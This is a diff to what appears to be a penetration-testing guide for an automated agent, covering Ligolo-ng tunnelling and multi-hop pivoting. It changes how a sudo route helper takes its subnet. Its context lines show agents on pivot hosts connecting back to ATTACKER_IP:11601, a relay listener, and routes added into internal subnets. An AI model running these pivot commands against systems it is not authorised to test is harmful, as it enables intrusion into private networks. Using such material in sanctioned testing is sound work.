@@ -412,7 +412,7 @@ session
 
 # Add route to internal subnet through the tunnel
 # Preferred (operator-free, when helpers are installed):
-sudo -n pen-agent-ligolo-route 10.10.10.0/24
+sudo -n LIGOLO_SUBNET=10.10.10.0/24 pen-agent-ligolo-route
 # Fallback (operator handoff):
 sudo ip route add 10.10.10.0/24 dev ligolo
 
@@ -451,7 +451,7 @@ Chain through multiple agents.
 ./agent -connect ATTACKER_IP:11601 -ignore-cert
 
 # Add route to Agent 2's network (preferred form; fallback: sudo ip route add 10.10.20.0/24 dev ligolo)
-sudo -n pen-agent-ligolo-route 10.10.20.0/24 2>/dev/null || sudo ip route add 10.10.20.0/24 dev ligolo
+sudo -n LIGOLO_SUBNET=10.10.20.0/24 pen-agent-ligolo-route 2>/dev/null || sudo ip route add 10.10.20.0/24 dev ligolo
 
 # Add listener on Agent 1 to relay Agent 2's connection
 # In proxy console (session 1):
@@ -461,7 +461,7 @@ listener_add --addr 0.0.0.0:11601 --to ATTACKER_IP:11601 --tcp
 ./agent -connect AGENT1_IP:11601 -ignore-cert
 
 # Add route to Agent 2's internal network (preferred form; fallback: sudo ip route add 10.10.30.0/24 dev ligolo)
-sudo -n pen-agent-ligolo-route 10.10.30.0/24 2>/dev/null || sudo ip route add 10.10.30.0/24 dev ligolo
+sudo -n LIGOLO_SUBNET=10.10.30.0/24 pen-agent-ligolo-route 2>/dev/null || sudo ip route add 10.10.30.0/24 dev ligolo
 ```
 
 ### Transfer Agent to Pivot
